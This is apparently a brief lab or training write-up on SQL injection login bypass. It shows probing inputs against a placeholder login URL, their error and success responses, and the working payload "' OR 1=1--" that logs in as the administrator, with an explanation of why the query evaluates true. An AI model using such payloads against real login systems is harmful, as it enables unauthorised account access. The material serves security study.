# SQL injection vulnerability allowing login bypass

### Goal:
`Log in to the application as the administrator user`
### Info: The injection point is the login functionality
`target.com/login?username=<user>&password=<password>`
<br><br><br>

**<ins>Step 1: Test the injection point</ins>**

username=administrator&password='

`500: internal server error`<br><br>

username=administrator&password='--

`200`

This indicates the existence of an SQL misconfiguration.
<br><br>

**<ins>Step 2: Exploit the vulnerability</ins>**

username=administrator&password=' OR 1=1--

`Success!`<br><br>

This request sends the server this query:

`password = '' OR 1=1`<br> `password = false OR true`

This evaluates to true and logs us in as the specified user.
